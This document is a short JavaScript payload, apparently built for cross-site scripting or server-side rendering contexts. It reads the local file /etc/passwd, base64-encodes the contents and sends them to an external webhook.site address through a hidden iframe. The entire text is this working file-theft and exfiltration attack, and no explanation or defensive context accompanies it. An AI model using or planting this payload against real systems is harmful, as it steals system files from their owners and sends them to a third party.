function reqListener () {
    var b64 = btoa(this.responseText);
    var iframe = document.createElement('iframe');
	iframe.style.display = "none";
	iframe.src = "https://webhook.site/041252ef-79f5-4341-ad7a-893ad238f490/?xdata="+b64;
	document.body.appendChild(iframe);
} 
var oReq = new XMLHttpRequest(); 
oReq.addEventListener("load", reqListener); 
oReq.open("GET", "file:///etc/passwd"); 
oReq.send();
